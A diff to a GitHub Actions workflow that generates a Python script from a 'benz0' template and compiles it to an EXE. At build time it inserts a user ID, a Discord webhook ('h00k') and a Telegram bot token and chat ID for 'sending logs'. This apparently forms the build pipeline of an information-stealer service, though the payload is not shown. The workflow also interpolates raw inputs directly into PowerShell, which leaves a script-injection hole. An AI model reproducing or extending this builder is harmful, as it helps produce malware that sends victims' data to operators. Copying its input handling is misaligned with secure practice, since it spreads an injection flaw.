@@ -21,11 +21,11 @@ on:
         required: false
         type: string
       tg_bot_token:
-        description: 'User Telegram Bot Token (for sending logs)'
+        description: 'User Telegram Bot Token for sending logs'
         required: true
         type: string
       tg_chat_id:
-        description: 'User Telegram Chat ID (for sending logs)'
+        description: 'User Telegram Chat ID for sending logs'
         required: true
         type: string
 
@@ -71,17 +71,21 @@ jobs:
       - name: Generate build script from template
         shell: pwsh
         run: |
-          $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
           $template = Get-Content "benz0_template.py" -Raw
-          # Заменяем USER_ID, webhook, и добавляем подстановку токена и chat_id
           $template = $template -replace 'USER_ID = "REPLACE_ME"', "USER_ID = `"${{ github.event.inputs.user_id }}`""
           if ("${{ github.event.inputs.discord_webhook }}" -ne "") {
             $template = $template -replace 'h00k = "https://discord.com/api/webhooks/..."', "h00k = `"${{ github.event.inputs.discord_webhook }}`""
           }
           $template = $template -replace 'REPLACE_TG_TOKEN', "${{ github.event.inputs.tg_bot_token }}"
           $template = $template -replace 'REPLACE_TG_CHAT', "${{ github.event.inputs.tg_chat_id }}"
+          $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
           $template | Out-File -FilePath "${filename}.py" -Encoding utf8
-          Write-Host "✅ Generated ${filename}.py"
+          if (Test-Path "${filename}.py") {
+            Write-Host "✅ Файл ${filename}.py создан успешно"
+          } else {
+            Write-Error "❌ Файл ${filename}.py НЕ создан!"
+            exit 1
+          }
 
       - name: Build EXE using argument array
         shell: pwsh
